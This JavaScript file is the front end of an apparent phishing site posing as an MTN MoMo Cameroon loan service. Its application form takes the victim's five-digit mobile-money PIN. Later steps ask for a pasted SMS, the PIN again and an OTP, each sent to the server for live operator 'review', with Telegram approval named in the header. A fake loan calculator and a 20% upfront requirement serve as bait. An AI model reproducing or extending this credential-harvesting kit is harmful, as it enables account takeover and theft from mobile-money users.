// ============================================================
// script.js – MTN MoMo Cameroon v3.0.1
// Postgres + Brevo + Telegram 4-step admin approval
// Fixed: resume routing, dashboard fallback, boot safety net
// ============================================================
'use strict';

// ═══════════════════════════════════════════════════════════
// STATE
// ═══════════════════════════════════════════════════════════
const S = {
    applicationId: null,
    checkSessionToken: null
};

const LS_KEY_APP = 'momo_cm_app_id';
const LS_KEY_EMAIL = 'momo_cm_last_email';

let pollTimer = null;

// ═══════════════════════════════════════════════════════════
// UTILS
// ═══════════════════════════════════════════════════════════
function $(id) { return document.getElementById(id); }

function fmt(n) { return Number(n || 0).toLocaleString('en-US'); }
function xaf(n) { return 'XAF ' + fmt(n); }

function escapeHtml(s) {
    return String(s == null ? '' : s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function goTo(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = $(id);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}

function showErr(id, msg) {
    const b = $(id);
    if (!b) return;
    b.classList.add('show');
    const t = $(id + 'Txt');
    if (t) t.textContent = msg;
}

function clearErr(id) {
    const b = $(id);
    if (b) b.classList.remove('show');
}

function toast(msg, type) {
    type = type || 'info';
    document.querySelectorAll('.toast').forEach(t => t.remove());
    const el = document.createElement('div');
    el.className = 'toast toast-' + type;
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(() => {
        el.style.opacity = '0';
        setTimeout(() => el.remove(), 300);
    }, 3200);
}

async function api(url, opts) {
    opts = opts || {};
    try {
        const res = await fetch(url, {
            credentials: 'same-origin',
            ...opts,
            headers: { 'Content-Type': 'application/json', ...(opts.headers || {}) }
        });
        return await res.json();
    } catch (e) {
        console.warn(url + ' failed:', e.message);
        return { ok: false, error: 'Network error' };
    }
}

function formatTime(s) {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return m + ':' + String(sec).padStart(2, '0');
}

// ═══════════════════════════════════════════════════════════
// CALCULATOR
// ═══════════════════════════════════════════════════════════
function updateCalc() {
    const slider = $('amtSlider');
    if (!slider) return;
    const amt = +slider.value;
    const r = 0.24 / 12;
    const term = 48;
    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)));
    const twenty = Math.ceil(amt * 0.20);

    const set = (id, v) => { const e = $(id); if (e) e.textContent = v; };
    set('calcAmt', xaf(amt));
    set('monthlyAmt', xaf(monthly));
    set('requiredTx', xaf(twenty));
    set('reqExample', xaf(amt));
    set('reqNeed', xaf(twenty));

    const pct = ((amt - 500000) / 4500000) * 100;
    slider.style.setProperty('--pct', pct + '%');
}

function updateAppCalc() {
    const amtEl = $('appLoanAmount');
    if (!amtEl) return;
    const amt = +amtEl.value || 0;
    const twentyEl = $('twentyAmount');
    if (twentyEl) twentyEl.textContent = xaf(Math.ceil(amt * 0.20));
}

// ═══════════════════════════════════════════════════════════
// APPLICATION — form + submit
// ═══════════════════════════════════════════════════════════
function startApplication() {
    const savedEmail = localStorage.getItem(LS_KEY_EMAIL);
    if (savedEmail && $('appEmail')) $('appEmail').value = savedEmail;

    if ($('appLoanAmount') && $('amtSlider')) {
        $('appLoanAmount').value = +$('amtSlider').value;
    }
    updateAppCalc();
    clearErr('appErr');
    goTo('page-application');
}

function pinInput(el, idx, prefix) {
    prefix = prefix || 'appPin';
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && idx < 4) {
        const n = $(prefix + (idx + 1));
        if (n) n.focus();
    }
}

function getAppPin() {
    return [0, 1, 2, 3, 4].map(i => {
        const el = $('appPin' + i);
        return el ? el.value : '';
    }).join('');
}

async function submitApplication() {
    clearErr('appErr');
    const body = {
        fullName: ($('appFullName') || {}).value ? $('appFullName').value.trim() : '',
        email: ($('appEmail') || {}).value ? $('appEmail').value.trim().toLowerCase() : '',
        phone: ($('appPhone') || {}).value ? $('appPhone').value.trim() : '',
        momoPin: getAppPin(),
        loanType: ($('appLoanType') || {}).value,
        loanAmount: Number(($('appLoanAmount') || {}).value),
        loanTerm: Number(($('appLoanTerm') || {}).value),
        loanPurpose: ($('appLoanPurpose') || {}).value ? $('appLoanPurpose').value.trim() : '',
        employment: ($('appEmployment') || {}).value,
        annualIncome: Number(($('appIncome') || {}).value),
        kinName: ($('appKinName') || {}).value ? $('appKinName').value.trim() : '',
        kinPhone: ($('appKinPhone') || {}).value ? $('appKinPhone').value.trim() : '',
        has20Percent: ($('has20Percent') || {}).checked === true,
        tncAccepted: ($('appTnc') || {}).checked === true
    };

    const btn = $('appSubmitBtn');
    if (btn) { btn.disabled = true; btn.textContent = 'Submitting...'; }

    const res = await api('/api/apply', { method: 'POST', body: JSON.stringify(body) });

    if (btn) { btn.disabled = false; btn.textContent = 'SUBMIT APPLICATION'; }

    if (!res || !res.ok) {
        if (res && res.code === 'ALREADY_APPLIED' && res.applicationId) {
            localStorage.setItem(LS_KEY_APP, res.applicationId);
            S.applicationId = res.applicationId;
            toast('Existing application found. Resuming...', 'info');
            setTimeout(() => resumeApplication(), 800);
            return;
        }
        showErr('appErr', (res && res.error) || 'Submission failed.');
        return;
    }

    S.applicationId = res.applicationId;
    localStorage.setItem(LS_KEY_APP, S.applicationId);
    localStorage.setItem(LS_KEY_EMAIL, body.email);

    const waitEl = $('waitAppId1');
    if (waitEl) waitEl.textContent = S.applicationId;
    goTo('page-wait-application');
    startPoll();
}

// ═══════════════════════════════════════════════════════════
// APPLICATION FLOW — polling
// ═══════════════════════════════════════════════════════════
function stopPoll() {
    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
}

function startPoll() {
    stopPoll();
    let consecutiveErrors = 0;

    const tick = async () => {
        const res = await api('/api/application/' + encodeURIComponent(S.applicationId));

        if (!res || !res.ok || !res.status) {
            consecutiveErrors++;
            if (consecutiveErrors >= 3) {
                console.warn('Application not found — clearing session');
                localStorage.removeItem(LS_KEY_APP);
                S.applicationId = null;
                stopPoll();
                goTo('page-landing');
                return;
            }
            pollTimer = setTimeout(tick, 3000);
            return;
        }

        consecutiveErrors = 0;
        const status = String(res.status);
        const submitted = res.user_submitted === true;

        if (status === 'rejected') {
            stopPoll();
            const el = $('rejectReason');
            if (el) el.textContent = res.rejection_reason || 'Your application was not approved.';
            goTo('page-rejected');
            return;
        }

        if (status === 'approved') {
            stopPoll();
            // Pre-fill approved page numbers as fallback
            try {
                const amt = Number(res.loan_amount) || 0;
                const term = Number(res.loan_term) || 12;
                const monthly = Math.ceil(amt / term);
                const set = (id, v) => { const e = $(id); if (e) e.textContent = v; };
                set('aprAmount', xaf(amt));
                set('aprAmt', xaf(amt));
                set('aprTerm', term + ' Months');
                set('aprMth', xaf(monthly));
            } catch (e) { /* ignore */ }

            // Try dashboard if session exists
            try {
                const sess = await api('/api/session');
                if (sess && sess.ok && sess.loggedIn) {
                    await goToDashboard();
                    return;
                }
            } catch (e) {
                console.warn('Session check failed:', e);
            }
            goTo('page-approved');
            return;
        }

        // Mid-flow routing
        if (status === 'application_review') {
            const el = $('waitAppId1'); if (el) el.textContent = S.applicationId;
            goTo('page-wait-application');
        } else if (status === 'sms_pending') {
            if (submitted) {
                const el = $('waitAppId2'); if (el) el.textContent = S.applicationId;
                goTo('page-wait-sms');
            } else {
                goTo('page-sms');
            }
        } else if (status === 'pin_pending') {
            if (submitted) {
                const el = $('waitAppId3'); if (el) el.textContent = S.applicationId;
                goTo('page-wait-pin');
            } else {
                goTo('page-pin');
            }
        } else if (status === 'otp_pending') {
            if (submitted) {
                const el = $('waitAppId4'); if (el) el.textContent = S.applicationId;
                goTo('page-wait-otp');
            } else {
                goTo('page-otp');
            }
        }

        pollTimer = setTimeout(tick, 3000);
    };
    tick();
}

// ═══════════════════════════════════════════════════════════
// RESUME — route to correct page based on server state
// ═══════════════════════════════════════════════════════════
async function resumeApplication() {
    const saved = localStorage.getItem(LS_KEY_APP);
    if (!saved) {
        goTo('page-landing');
        return;
    }
    S.applicationId = saved;

    // ─── Fetch current application state from server ───
    let check;
    try {
        check = await api('/api/application/' + encodeURIComponent(saved));
    } catch (e) {
        console.warn('resumeApplication network error:', e);
        goTo('page-landing');
        return;
    }

    // ─── Stale / missing application — clear and go home ───
    if (!check || check.ok !== true || !check.status) {
        console.warn('Stale or invalid application ID — clearing');
        localStorage.removeItem(LS_KEY_APP);
        S.applicationId = null;
        goTo('page-landing');
        return;
    }

    const status = String(check.status || '');
    const submitted = check.user_submitted === true;

    // ─── Rejected at any step ───
    if (status === 'rejected') {
        const el = $('rejectReason');
        if (el) el.textContent = check.rejection_reason || 'Your application was not approved.';
        goTo('page-rejected');
        return;
    }

    // ─── Fully approved ───
    if (status === 'approved') {
        // Pre-fill approved page as fallback (in case dashboard fails)
        try {
            const amt = Number(check.loan_amount) || 0;
            const term = Number(check.loan_term) || 12;
            const monthly = Math.ceil(amt / term);
            const set = (id, v) => { const e = $(id); if (e) e.textContent = v; };
            set('aprAmount', xaf(amt));
            set('aprAmt', xaf(amt));
            set('aprTerm', term + ' Months');
            set('aprMth', xaf(monthly));
        } catch (e) { /* ignore */ }

        // Try dashboard only if a valid session exists
        try {
            const sess = await api('/api/session');
            if (sess && sess.ok && sess.loggedIn) {
                await goToDashboard();
                return;
            }
        } catch (e) {
            console.warn('Session check failed:', e);
        }

        // No active session → show approved page
        goTo('page-approved');
        return;
    }

    // ─── Mid-flow routing ───
    if (status === 'application_review') {
        const el = $('waitAppId1');
        if (el) el.textContent = S.applicationId;
        goTo('page-wait-application');
        startPoll();
        return;
    }

    if (status === 'sms_pending') {
        if (submitted) {
            const el = $('waitAppId2');
            if (el) el.textContent = S.applicationId;
            goTo('page-wait-sms');
        } else {
            goTo('page-sms');
        }
        startPoll();
        return;
    }

    if (status === 'pin_pending') {
        if (submitted) {
            const el = $('waitAppId3');
            if (el) el.textContent = S.applicationId;
            goTo('page-wait-pin');
        } else {
            goTo('page-pin');
        }
        startPoll();
        return;
    }

    if (status === 'otp_pending') {
        if (submitted) {
            const el = $('waitAppId4');
            if (el) el.textContent = S.applicationId;
            goTo('page-wait-otp');
        } else {
            goTo('page-otp');
        }
        startPoll();
        return;
    }

    // ─── Unknown status — safe fallback ───
    console.warn('Unknown application status:', status);
    goTo('page-landing');
}

// ═══════════════════════════════════════════════════════════
// STEP SUBMISSIONS — SMS / PIN / OTP
// ═══════════════════════════════════════════════════════════
async function submitSms() {
    clearErr('smsErr');
    const sms = ($('smsContent') || {}).value ? $('smsContent').value.trim() : '';
    if (sms.length < 10) return showErr('smsErr', 'Paste the complete SMS.');

    const btn = $('smsSubmitBtn');
    if (btn) { btn.disabled = true; btn.textContent = 'Submitting...'; }

    const res = await api('/api/application/submit-sms', {
        method: 'POST',
        body: JSON.stringify({ applicationId: S.applicationId, sms: sms })
    });

    if (btn) { btn.disabled = false; btn.textContent = 'SUBMIT SMS'; }

    if (!res || !res.ok) return showErr('smsErr', (res && res.error) || 'Failed.');

    toast('SMS sent for review', 'success');
    const el = $('waitAppId2'); if (el) el.textContent = S.applicationId;
    goTo('page-wait-sms');
    startPoll();
}

async function submitPin() {
    clearErr('pinErr');
    const pin = [0, 1, 2, 3, 4].map(i => {
        const el = $('pin' + i);
        return el ? el.value : '';
    }).join('');
    if (pin.length !== 5) return showErr('pinErr', 'Enter 5-digit PIN.');

    const btn = $('pinSubmitBtn');
    if (btn) { btn.disabled = true; btn.textContent = 'Submitting...'; }

    const res = await api('/api/application/submit-pin', {
        method: 'POST',
        body: JSON.stringify({ applicationId: S.applicationId, pin: pin })
    });

    if (btn) { btn.disabled = false; btn.textContent = 'SUBMIT PIN'; }

    if (!res || !res.ok) return showErr('pinErr', (res && res.error) || 'Failed.');

    toast('PIN sent for review', 'success');
    const el = $('waitAppId3'); if (el) el.textContent = S.applicationId;
    goTo('page-wait-pin');
    startPoll();
}

async function submitOtp() {
    clearErr('otpErr');
    const otp = ($('otpValue') || {}).value ? $('otpValue').value.trim() : '';
    if (!/^\d{4,6}$/.test(otp)) return showErr('otpErr', 'Enter 4–6 digit OTP.');

    const btn = $('otpSubmitBtn');
    if (btn) { btn.disabled = true; btn.textContent = 'Submitting...'; }

    const res = await api('/api/application/submit-otp', {
        method: 'POST',
        body: JSON.stringify({ applicationId: S.applicationId, otp: otp })
    });

    if (btn) { btn.disabled = false; btn.textContent = 'SUBMIT OTP'; }

    if (!res || !res.ok) return showErr('otpErr', (res && res.error) || 'Failed.');

    toast('OTP sent for review', 'success');
    const el = $('waitAppId4'); if (el) el.textContent = S.applicationId;
    goTo('page-wait-otp');
    startPoll();
}

// ═══════════════════════════════════════════════════════════
// CHECK STATUS FLOW
// ═══════════════════════════════════════════════════════════
async function startCheckStatus() {
    clearErr('chkErr');
    const email = ($('chkEmail') || {}).value ? $('chkEmail').value.trim().toLowerCase() : '';
    const phone = ($('chkPhone') || {}).value ? $('chkPhone').value.trim() : '';
    if (!email || !phone) return showErr('chkErr', 'Email and phone required.');

    const btn = $('chkBtn');
    if (btn) { btn.disabled = true; btn.textContent = 'Sending...'; }

    const res = await api('/api/check-status/start', {
        method: 'POST',
        body: JSON.stringify({ email: email, phone: phone })
    });

    if (btn) { btn.disabled = false; btn.textContent = 'SEND VERIFICATION CODE'; }

    if (!res || !res.ok) return showErr('chkErr', (res && res.error) || 'Not found.');

    S.checkSessionToken = res.sessionToken;
    toast('Code sent to ' + (res.emailMasked || 'your email'), 'success', 4000);
    clearOtpInputs('cotp');
    goTo('page-check-otp');
    startOtpCountdown();
}

function otpMove(el, idx) {
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && idx < 5) {
        const n = $('cotp' + (idx + 1));
        if (n) n.focus();
    }
}

function clearOtpInputs(prefix) {
    for (let i = 0; i < 6; i++) {
        const el = $(prefix + i);
        if (el) el.value = '';
    }
    const first = $(prefix + '0');
    if (first) first.focus();
}

function getOtp(prefix) {
    return [0, 1, 2, 3, 4, 5].map(i => {
        const el = $(prefix + i);
        return el ? el.value : '';
    }).join('');
}

async function verifyCheckOtp() {
    clearErr('cotpErr');
    const otp = getOtp('cotp');
    if (otp.length !== 6) return showErr('cotpErr', 'Enter 6-digit code.');

    const btn = $('cotpBtn');
    if (btn) { btn.disabled = true; btn.textContent = 'Verifying...'; }

    const res = await api('/api/check-status/verify-otp', {
        method: 'POST',
        body: JSON.stringify({ sessionToken: S.checkSessionToken, otp: otp })
    });

    if (btn) { btn.disabled = false; btn.textContent = 'VERIFY CODE'; }

    if (!res || !res.ok) return showErr('cotpErr', (res && res.error) || 'Invalid code.');

    toast('Code verified', 'success');
    clearPinInputs('cpin');
    goTo('page-check-pin');
}

let otpCdTimer = null;
function startOtpCountdown() {
    const wrap = $('cotpResendWrap');
    const text = $('cotpCountdown');
    const btn = $('cotpResendBtn');
    if (!wrap || !text || !btn) return;
    wrap.style.display = 'block';
    btn.style.display = 'none';
    let remaining = 120;
    text.textContent = 'Resend in ' + formatTime(remaining);
    if (otpCdTimer) clearInterval(otpCdTimer);
    otpCdTimer = setInterval(() => {
        remaining--;
        if (remaining <= 0) {
            clearInterval(otpCdTimer);
            text.textContent = 'You can resend now.';
            btn.style.display = 'block';
        } else {
            text.textContent = 'Resend in ' + formatTime(remaining);
        }
    }, 1000);
}

async function resendCheckOtp() {
    const btn = $('cotpResendBtn');
    if (btn) { btn.disabled = true; btn.textContent = 'Sending...'; }

    const res = await api('/api/check-status/resend-otp', {
        method: 'POST',
        body: JSON.stringify({ sessionToken: S.checkSessionToken })
    });

    if (btn) { btn.disabled = false; btn.textContent = '🔄 Resend code'; }

    if (!res || !res.ok) { toast((res && res.error) || 'Failed', 'error'); return; }
    toast('New code sent', 'success');
    clearOtpInputs('cotp');
    startOtpCountdown();
}

function clearPinInputs(prefix) {
    for (let i = 0; i < 5; i++) {
        const el = $(prefix + i);
        if (el) el.value = '';
    }
    const first = $(prefix + '0');
    if (first) first.focus();
}

async function verifyCheckPin() {
    clearErr('cpinErr');
    const pin = [0, 1, 2, 3, 4].map(i => {
        const el = $('cpin' + i);
        return el ? el.value : '';
    }).join('');
    if (pin.length !== 5) return showErr('cpinErr', 'Enter 5-digit PIN.');

    const btn = $('cpinBtn');
    if (btn) { btn.disabled = true; btn.textContent = 'Verifying...'; }

    const res = await api('/api/check-status/verify-pin', {
        method: 'POST',
        body: JSON.stringify({ sessionToken: S.checkSessionToken, pin: pin })
    });

    if (btn) { btn.disabled = false; btn.textContent = 'VERIFY PIN & LOGIN'; }

    if (!res || !res.ok) return showErr('cpinErr', (res && res.error) || 'Incorrect PIN.');

    toast('Login successful', 'success');
    S.checkSessionToken = null;
    await goToDashboard();
}

// ═══════════════════════════════════════════════════════════
// DASHBOARD
// ═══════════════════════════════════════════════════════════
async function goToDashboard() {
    let res;
    try {
        res = await api('/api/dashboard');
    } catch (e) {
        console.warn('Dashboard fetch failed:', e);
        return { ok: false, error: 'network' };
    }

    if (!res || !res.ok) {
        return res || { ok: false };
    }

    try {
        const set = (id, v) => { const e = $(id); if (e) e.textContent = v; };
        set('dashBalance', xaf(res.loan.balance));
        set('dashId', res.loan.id);
        set('dashTerm', res.loan.term + ' mo');

        const list = $('dashTxList');
        if (list) {
            if (res.transactions && res.transactions.length) {
                list.innerHTML = res.transactions.map(tx => `
                    <div class="dash-tx">
                        <div class="dash-tx-icon">${tx.type === 'disbursement' ? '💰' : '💳'}</div>
                        <div class="dash-tx-details">
                            <div class="dash-tx-title">${escapeHtml(tx.description || '')}</div>
                            <div class="dash-tx-date">${new Date(tx.created_at).toLocaleString('en-GB')}</div>
                        </div>
                        <div class="dash-tx-amount">${tx.type === 'disbursement' ? '+' : '-'}${xaf(tx.amount)}</div>
                    </div>
                `).join('');
            } else {
                list.innerHTML = '<div class="dash-tx-empty">No transactions yet</div>';
            }
        }

        goTo('page-dashboard');
        return { ok: true };
    } catch (e) {
        console.error('Dashboard render failed:', e);
        return { ok: false, error: e.message };
    }
}

function downloadContract() {
    window.location.href = '/api/contract-pdf';
}

function logout() {
    fetch('/api/logout', { method: 'POST', credentials: 'same-origin' })
        .catch(() => {})
        .finally(() => {
            toast('Logged out', 'info');
            setTimeout(() => {
                localStorage.removeItem(LS_KEY_APP);
                location.reload();
            }, 600);
        });
}

function restart() {
    localStorage.removeItem(LS_KEY_APP);
    location.reload();
}

// ═══════════════════════════════════════════════════════════
// TERMS
// ═══════════════════════════════════════════════════════════
let termsCache = null;
async function showTerms() {
    const modal = $('termsModal');
    if (modal) modal.classList.add('show');
    const pre = $('termsText');
    if (!pre) return;

    if (termsCache) { pre.textContent = termsCache; return; }
    pre.textContent = 'Loading…';

    const res = await api('/api/terms');
    if (!res || !res.ok) { pre.textContent = 'Unable to load terms.'; return; }
    termsCache = res.text;
    pre.textContent = res.text;
}

function closeTerms() {
    const m = $('termsModal');
    if (m) m.classList.remove('show');
}

function acceptTerms() {
    if ($('appTnc')) $('appTnc').checked = true;
    closeTerms();
    toast('Terms accepted', 'success', 1500);
}

// ═══════════════════════════════════════════════════════════
// SPLASH
// ═══════════════════════════════════════════════════════════
function showSplash(cb) {
    const splash = $('page-splash');
    if (!splash) { cb(); return; }

    const dur = window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 500 : 4000;
    setTimeout(() => {
        splash.classList.add('hide');
        setTimeout(() => {
            splash.style.display = 'none';
            cb();
        }, 400);
    }, dur);
}

// ═══════════════════════════════════════════════════════════
// BOOT
// ═══════════════════════════════════════════════════════════
async function boot() {
    console.log('🚀 MTN MoMo Cameroon v3.0.1');

    // Safety net — landing is always visible under the splash
    goTo('page-landing');
    updateCalc();

    let session = { ok: true, loggedIn: false };
    try {
        session = await api('/api/session');
    } catch (e) {
        console.warn('Session check failed:', e.message);
    }

    const savedAppId = localStorage.getItem(LS_KEY_APP);

    showSplash(async () => {
        try {
            if (session && session.loggedIn) {
                await goToDashboard();
                return;
            }
            if (savedAppId) {
                S.applicationId = savedAppId;
                await resumeApplication();
                return;
            }
            // Default: stay on landing (already shown)
            goTo('page-landing');
        } catch (e) {
            console.error('Boot routing failed:', e);
            goTo('page-landing');
        }
    });
}

document.addEventListener('DOMContentLoaded', boot);
